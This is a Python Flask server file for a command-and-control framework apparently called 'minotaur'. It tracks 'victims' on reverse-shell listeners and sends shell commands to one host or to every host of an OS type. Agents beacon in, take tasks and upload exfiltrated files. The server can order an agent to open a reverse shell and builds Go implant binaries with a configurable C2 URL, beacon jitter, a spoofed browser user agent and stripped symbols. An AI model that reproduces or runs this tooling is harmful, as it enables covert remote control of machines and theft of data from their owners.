# server/app.py
import os
import subprocess
import tempfile
import shutil
from flask import Flask, render_template, request, jsonify, send_file
from flask_socketio import SocketIO, emit
from datetime import datetime

from models.victim import VictimManager
from models.port_event import PortEventManager
from listeners.port_manager import PortManager
from handlers.command_handler import CommandHandler
from handlers.agent_handler import AgentManager
from handlers.activity_logger import ActivityLogger
from utils.logger import setup_logger

app = Flask(__name__, template_folder='../web/templates', static_folder='../web/static')
app.config['SECRET_KEY'] = 'change-this-in-production'

socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# Initialize managers
victim_mgr = VictimManager(socketio)
port_event_mgr = PortEventManager()
port_mgr = PortManager(victim_mgr, port_event_mgr, socketio)
cmd_handler = CommandHandler(victim_mgr)
agent_mgr = AgentManager(socketio)
activity_logger = ActivityLogger()

logger = setup_logger()

# ------------------- TCP Shells -------------------
@app.route('/')
def index():
    return render_template('dashboard.html')

@app.route('/api/victims')
def get_victims():
    return jsonify(victim_mgr.get_all_victims())

@app.route('/api/open_port', methods=['POST'])
def open_port():
    data = request.json
    port = data.get('port')
    if not port:
        return jsonify({'error': 'Port number required'}), 400
    try:
        port = int(port)
        port_mgr.start_listener(port)
        return jsonify({'status': 'listening', 'port': port})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/stop_port', methods=['POST'])
def stop_port():
    data = request.json
    port = data.get('port')
    if not port:
        return jsonify({'error': 'Port required'}), 400
    if port_mgr.stop_listener(int(port)):
        return jsonify({'status': 'stopped', 'port': port})
    return jsonify({'error': 'Port not listening'}), 404

@app.route('/api/port_events')
def get_port_events():
    limit = request.args.get('limit', 50, type=int)
    events = port_event_mgr.get_recent_events(limit)
    return jsonify(events)

@app.route('/api/active_ports')
def get_active_ports():
    ports = port_mgr.get_active_ports()
    return jsonify(ports)

@app.route('/api/execute', methods=['POST'])
def execute_command():
    data = request.json
    target = data.get('target')
    command = data.get('command')
    if target == 'single':
        victim_id = data.get('victim_id')
        if not victim_id:
            return jsonify({'error': 'victim_id required'}), 400
        result = cmd_handler.execute_on_victim(victim_id, command)
        return jsonify(result)
    elif target == 'os':
        os_type = data.get('os_type')
        if not os_type:
            return jsonify({'error': 'os_type required'}), 400
        results = cmd_handler.execute_on_os(os_type, command)
        return jsonify(results)
    else:
        return jsonify({'error': 'Invalid target type'}), 400

@app.route('/api/set_os', methods=['POST'])
def set_victim_os():
    data = request.json
    victim_id = data.get('victim_id')
    os_type = data.get('os_type')
    if not victim_id or not os_type:
        return jsonify({'error': 'victim_id and os_type required'}), 400
    if victim_mgr.update_victim_os(victim_id, os_type):
        return jsonify({'status': 'updated'})
    return jsonify({'error': 'Victim not found'}), 404

# ------------------- HTTP Agents -------------------
@app.route('/api/agent/register', methods=['POST'])
def agent_register():
    data = request.json
    hostname = data.get('hostname')
    os_type = data.get('os')
    ip = data.get('ip')
    arch = data.get('arch')
    if not hostname or not os_type:
        return jsonify({'error': 'Missing fields'}), 400
    agent_id = agent_mgr.register_agent(hostname, os_type, ip, arch)
    return jsonify({'agent_id': agent_id})

@app.route('/api/agent/beacon', methods=['POST'])
def agent_beacon():
    data = request.json
    agent_id = data.get('id')
    if not agent_id:
        return jsonify({'error': 'Agent ID required'}), 400
    agent_mgr.update_beacon(agent_id)
    commands = agent_mgr.get_pending_commands(agent_id)
    return jsonify(commands)

@app.route('/api/agent/result', methods=['POST'])
def agent_result():
    data = request.json
    cmd_id = data.get('command_id')
    agent_id = data.get('agent_id')
    output = data.get('output', '')
    error = data.get('error', '')
    if not agent_id:
        agent_id = agent_mgr.get_agent_id_for_command(cmd_id)
        if not agent_id:
            return jsonify({'error': 'Command not found'}), 404
    agent_mgr.save_result(cmd_id, agent_id, output, error)
    return jsonify({'status': 'ok'})

@app.route('/api/agent/exfil', methods=['POST'])
def agent_exfil():
    data = request.json
    agent_id = data.get('agent_id')
    file_path = data.get('file_path')
    file_b64 = data.get('file_base64')
    if not all([agent_id, file_path, file_b64]):
        return jsonify({'error': 'Missing fields'}), 400
    agent_mgr.save_exfil(agent_id, file_path, file_b64)
    return jsonify({'status': 'ok'})

@app.route('/api/agent/send_command', methods=['POST'])
def send_agent_command():
    data = request.json
    agent_id = data.get('agent_id')
    cmd_type = data.get('type')
    payload = data.get('payload')
    if not agent_id or not cmd_type:
        return jsonify({'error': 'Missing fields'}), 400
    cmd_id = agent_mgr.add_command(agent_id, cmd_type, payload)
    return jsonify({'command_id': cmd_id})

@app.route('/api/agent/shell', methods=['POST'])
def agent_shell():
    data = request.json
    agent_id = data.get('agent_id')
    ip = data.get('ip')
    port = data.get('port')
    if not agent_id or not ip or not port:
        return jsonify({'error': 'Missing fields'}), 400
    agent_mgr.add_command(agent_id, 'shell', {'ip': ip, 'port': port})
    return jsonify({'status': 'sent'})

@app.route('/api/agent/delete', methods=['POST'])
def agent_delete():
    data = request.json
    agent_id = data.get('agent_id')
    if not agent_id:
        return jsonify({'error': 'Agent ID required'}), 400
    agent_mgr.add_command(agent_id, 'delete', {})
    agent_mgr.delete_agent(agent_id)
    return jsonify({'status': 'deleted'})

@app.route('/api/agents')
def list_agents():
    return jsonify(agent_mgr.list_agents())

@app.route('/api/agents/clear_all', methods=['POST'])
def clear_all_agents():
    agent_mgr.clear_all_agents()
    return jsonify({'status': 'cleared'})

@app.route('/api/open_ports', methods=['POST'])
def open_ports():
    data = request.json
    port_range = data.get('range')
    if not port_range:
        return jsonify({'error': 'Port range required'}), 400
    try:
        if '-' in port_range:
            start, end = map(int, port_range.split('-'))
            if start > end:
                return jsonify({'error': 'Invalid range: start > end'}), 400
            if end - start + 1 > 100:
                return jsonify({'error': 'Range too large (max 100 ports)'}), 400
            ports = list(range(start, end+1))
        else:
            ports = [int(port_range)]
    except ValueError:
        return jsonify({'error': 'Invalid port or range format'}), 400
    results = []
    for port in ports:
        try:
            port_mgr.start_listener(port)
            results.append({'port': port, 'status': 'listening'})
        except Exception as e:
            results.append({'port': port, 'error': str(e)})
    return jsonify(results)

# ------------------- Activity Logs -------------------
@app.route('/api/activity/shell')
def get_shell_activity():
    victim_id = request.args.get('victim_id')
    limit = request.args.get('limit', 100, type=int)
    logs = activity_logger.get_shell_logs(victim_id, limit)
    return jsonify(logs)

@app.route('/api/activity/agent')
def get_agent_activity():
    agent_id = request.args.get('agent_id')
    limit = request.args.get('limit', 100, type=int)
    logs = activity_logger.get_agent_logs(agent_id, limit)
    return jsonify(logs)

# ------------------- Build Agent -------------------
@app.route('/api/build_agent', methods=['POST'])
def build_agent():
    data = request.json
    c2_url = data.get('c2_url', 'http://127.0.0.1:5000')
    beacon_delay = data.get('beacon_delay', 60)
    jitter = data.get('jitter', 5)
    user_agent = data.get('user_agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
    insecure_tls = data.get('insecure_tls', True)
    goos = data.get('goos', 'windows')
    goarch = data.get('goarch', 'amd64')

    if not c2_url.startswith(('http://', 'https://')):
        return jsonify({'error': 'C2 URL must start with http:// or https://'}), 400
    if beacon_delay < 5:
        beacon_delay = 5
    if jitter < 0:
        jitter = 0

    # Read the agent template from the external file
    template_path = os.path.join(os.path.dirname(__file__), 'agent_template.go')
    if not os.path.exists(template_path):
        return jsonify({'error': 'Agent template not found'}), 500

    with open(template_path, 'r') as f:
        agent_code = f.read()

    # Replace placeholders
    agent_code = agent_code.replace('{{ .C2URL }}', c2_url)
    agent_code = agent_code.replace('{{ .BeaconDelay }}', str(beacon_delay))
    agent_code = agent_code.replace('{{ .Jitter }}', str(jitter))
    agent_code = agent_code.replace('{{ .UserAgent }}', user_agent)
    agent_code = agent_code.replace('{{ .InsecureTLS }}', str(insecure_tls).lower())

    # Create temporary directory
    temp_dir = tempfile.mkdtemp()
    go_file = os.path.join(temp_dir, 'main.go')
    with open(go_file, 'w') as f:
        f.write(agent_code)

    # Initialise Go module
    subprocess.run(['go', 'mod', 'init', 'minotaur-agent'], cwd=temp_dir, capture_output=True, text=True)
    subprocess.run(['go', 'mod', 'tidy'], cwd=temp_dir, capture_output=True, text=True)

    output_name = f'minotaur_agent_{goos}_{goarch}'
    if goos == 'windows':
        output_name += '.exe'

    build_cmd = ['go', 'build', '-ldflags=-s -w', '-o', output_name]
    env = os.environ.copy()
    env['GOOS'] = goos
    env['GOARCH'] = goarch
    env['CGO_ENABLED'] = '0'

    result = subprocess.run(build_cmd, cwd=temp_dir, env=env, capture_output=True, text=True)

    if result.returncode != 0:
        shutil.rmtree(temp_dir)
        return jsonify({'error': f'Build failed: {result.stderr}'}), 500

    binary_path = os.path.join(temp_dir, output_name)
    return send_file(binary_path, as_attachment=True, download_name=output_name)

# ------------------- SocketIO Events -------------------
@socketio.on('connect')
def handle_connect():
    logger.info(f"Client connected: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    logger.info(f"Client disconnected: {request.sid}")

# ------------------- Main -------------------
if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)